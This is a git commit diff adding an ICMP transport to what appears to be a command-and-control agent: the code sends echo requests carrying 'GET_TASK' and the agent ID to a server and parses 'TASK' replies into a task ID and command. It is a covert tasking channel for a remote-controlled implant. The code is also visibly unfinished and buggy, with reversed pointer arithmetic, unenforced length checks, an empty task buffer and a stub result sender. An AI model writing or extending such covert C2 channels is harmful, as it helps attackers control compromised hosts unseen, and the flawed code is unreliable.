84e8e3ebcfccee3b006f51561ecc72fb305e4e0e
tv00iPapa <dpilguev@yandex.com>
2026-09-13 21:10:00 +0300

    Continue of development icmp-listener.

--- agent/transport_icmp.c
+++ agent/transport_icmp.c
@@ -51,7 +51,7 @@ int checksum(uint8_t* data, int len) {
 static int icmp_init(void) {
     current_sockfd = socket(AF_INET, SOCK_RAW, IPPROTO_ICMP);
     if(current_sockfd < 0) {
-        printf("[-/ICMP] Error create socket.");
+        printf("[-/ICMP] Error create socket.\n");
         return 1;
     }
 
@@ -71,50 +71,131 @@ static int icmp_init(void) {
  * @return В случае положительного исхода - 0
 */
 static int icmp_get_command(/*[OUT]*/ char* command,/*[OUT]*/ char* task_id, size_t max_len_command, size_t max_len_task_id, char* agent_id) {
-    return 0;
-}
-
-int main() {
-    //сырой сокет домена AF_INET протокола IPPROTO_ICMP
-    int sock = socket(AF_INET, SOCK_RAW, IPPROTO_ICMP);
-    if(sock < 0) {
-        printf("[-/ICMP] Error create socket.");
-        return 1;
-    }
-
-//==========ICMP packet======================================
-    char packet[64]; //буфер для создания icmp пакета
+    char packet[64]; //buf for icmp-packet
     memset(packet, 0, sizeof(packet));
 
     //наложение структуры заголовка icmp пакета на буфер
-    struct icmphdr* icmp = (struct icmphdr*)packet;
+    struct icmphdr* icmp_header = (struct icmphdr*)packet;
 
     //заполнение полей
-    icmp->type = ICMP_ECHO; //type 8
-    icmp->code = 0; //0 - без особого значения
-    icmp->un.echo.id = htons(0x666); //идентификатор
-    icmp->un.echo.sequence = htons(1); //серийный номер
-                                                  
+    icmp_header->type = ICMP_ECHO; //type 8
+    icmp_header->code = 0; //0 - без особого значения
+    icmp_header->un.echo.id = htons(0x666); //идентификатор
+    icmp_header->un.echo.sequence = htons(1); //серийный номер
+
     //данные
-    char* payload = packet + sizeof(struct icmphdr);
-    strcpy(payload, "HELLO");
+    char* data_dest = packet + sizeof(struct icmphdr);
+    snprintf(data_dest, 30, "GET_TASK|%s|", agent_id);
+    int packet_len = sizeof(struct icmphdr) + strlen(data_dest);
 
-    int packet_len = sizeof(struct icmphdr) + strlen("HELLO");
-    icmp->checksum = checksum(packet, packet_len);
+    //контрольная сумма
+    icmp_header->checksum = checksum((uint8_t*)packet, packet_len);
 
-//=====отправка ICMP пакета=================================
+    //отправка ICMP пакета
     struct sockaddr_in dest = {
-        .sin_family = AF_INET,
+        .sin_family = AF_INET, 
     };
-    inet_pton(AF_INET, SERVER_IP, &dest.sin_addr);    
+    inet_pton(AF_INET, SERVER_IP, &dest.sin_addr);
 
     //отправка этого пакета
-    if(sendto(sock, packet, packet_len, 0, (struct sockaddr*)&dest, sizeof(dest)) < 0) {
-        printf("[-/ICMP] Error send icmp-packet.");
+    if(sendto(current_sockfd, packet, packet_len, 0, (struct sockaddr*)&dest, sizeof(dest)) < 0) {
+        printf("[-/ICMP] Error send icmp-packet.\n");
+        return 0;
     } else {
-        printf("[+/ICMP] Send icmp-packet to agent success.");
+        printf("[+/ICMP] Send icmp-packet for get task.\n");
     }
 
-    close(sock);
+    //получение ответа от сервера
+    struct sockaddr_in from;
+    socklen_t from_len = sizeof(from);
+    memset(packet, 0, sizeof(packet));
+
+    int recv_len = recvfrom(current_sockfd, packet, sizeof(packet), 0, (struct sockaddr*)&from, &from_len);
+    
+    if(recv_len < 0) {
+        printf("[-/ICMP] Error recvfrom.\n");
+        return 0;
+    } else {
+        //анализ
+        //данные приходят в сырой сокет с ip заголовком, который тоже надо обработать
+        struct iphdr* ip = (struct iphdr*)packet;
+
+        int ip_hdr_len = ip->ihl * 4; //длина ip заголовка (ед. изм. = 4 байта)
+        
+        //icmp заголовок
+        struct icmphdr* icmp_hdr = (struct icmphdr*)(packet + ip_hdr_len);
+
+        if(icmp_hdr->type == ICMP_ECHOREPLY) {
+            printf("[+/ICMP] Recevied task from server (%s).\n", inet_ntoa(from.sin_addr));
+            
+            int data_from_len = recv_len - ip_hdr_len - sizeof(struct icmphdr);
+            if(data_from_len > 0) {
+                char* data_from = packet + ip_hdr_len + sizeof(struct icmphdr);
+
+                //парсинг полученных данных
+                if(data_from[0] == 'T' && data_from[1] == 'A' && data_from[2] == 'S' &&
+                        data_from[3] == 'K' && data_from[4] == '|') {
+                    data_from += 5;
+                    char* pos = strchr(data_from, '|');
+                    if(pos != NULL) {
+                        //длина до разделителя
+                        size_t len = data_from - pos;
+                        if(len > max_len_task_id) {
+                            printf("[-/ICMP] Error. Len task_id invalid.\n");
+                        }
+                        char task_id_tmp[50] = {0};
+                        memcpy(task_id_tmp, data_from, len);
+                        data_from += (len + 1);
+
+                        //само задание
+                        pos = strchr(data_from, '|');
+                        if(pos != NULL) {
+                            len = data_from - pos;
+                            if(len > max_len_command) {
+                                printf("[-/ICMP] Error. Len task_command invalid.\n");
+                            }
+                            char task[100] = {0};
+
+                            printf("[+/ICMP] Получена задача (%s): %s\n", task_id_tmp, task);
+
+                            strcpy(task_id, task_id_tmp);
+                            strcpy(command, task);                                
+                        } else {
+                            printf("[-/ICMP] Invalid task.\n");
+                        }
+                    } else {
+                        printf("[-/ICMP] Invalid task_id.\n");
+                    }
+                } else {
+                    printf("[-/ICMP] Invalid data(header).\n");
+                    return 1;
+                }
+            } else {
+                printf("[-/ICMP] The data is missing.\n");
+                return 1;
+            }
+        }
+    }
+
     return 0;
 }
+
+/**
+ * @return В случае положительного исхода - 0
+*/
+static int icmp_send_result(char* task_id, char* result) {
+    return 0;
+}
+
+void icmp_cleanup(void) {
+    close(current_sockfd);
+}
+
+//export module
+TransportModule icmp_transport = {
+    .name = "ICMP",
+    .init = icmp_init,
+    .get_command = icmp_get_command,
+    .send_result = icmp_send_result,
+    .cleanup = icmp_cleanup
+};
